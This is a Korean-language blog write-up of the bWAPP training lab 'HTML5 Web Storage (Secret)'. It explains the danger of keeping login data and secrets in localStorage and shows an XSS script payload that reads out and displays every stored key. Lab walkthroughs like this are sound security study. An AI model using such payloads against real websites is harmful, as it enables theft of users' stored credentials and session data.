---
layout: single
title: (bWAPP)HTML5 Web Storage (Secret)
categories: bwapp
tag: [spoofing,mitm, bwapp, bee box, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 취약점 설명
> HTML5 Web Storge는 웹 브라우저에서 데이터를 클라이언트 측에 저장할 수 있는 기술이다. 보통 Web Storage는 로컬 스토리지와 세션 스토리지라는 두 개의 메커니즘이 존재하며, 각각 영구적으로 저장되거나 세션 중에만 유지되는 데이터를 제공한다. 이 때 민감 혹은 중요 데이터를 Web Storage에 저장하는 것은 보안위협이 존재한다. 임의의 사용자가 쉽게 접근할 수 있기 때문이다.

![그림 1-1](/assets/image/bwapp/sensitive%20data%20exposure/HTML5%20Web%20Storage%20(Secret)/image.png)
- 로그인 정보와 secret 값들이 HTML5 Web Sotrage에 저장되어 있다고 한다.

```
if(typeof(Storage) !== "undefined")
{

    localStorage.login = "bee";
    localStorage.secret = "Any bugs?";

}
else
{

    alert("Sorry, your browser does not support web storage...");

}
```

- 우선 해당 페이지의 소스코드를 보게되면 현재 접속되어 있는 사용자에 대한 로그인 정보와 secret값이 고스란히 나오고 있다.
- 이 내용들을 기반으로 xss 취약점과 연계시키면 될 듯 하다.

```
<script>
    var str = "";
    for(var key in localStorage) {
        str += "<br>" + key + " = " + localStorage.getItem(key);
    }
    
    document.write(str);
</script>
```

- 위 코드를 통해 웹 브라우저의 로컬 스토리지에 저장된 데이터를 모두 읽어와 화면에 출력시킨다.

![그림 1-2](/assets/image/bwapp/sensitive%20data%20exposure/HTML5%20Web%20Storage%20(Secret)/image-1.png)
- xss를 통해 로컬 스토리지에 저장된 데이터가 화면에 출력되는 것을 볼 수 있다.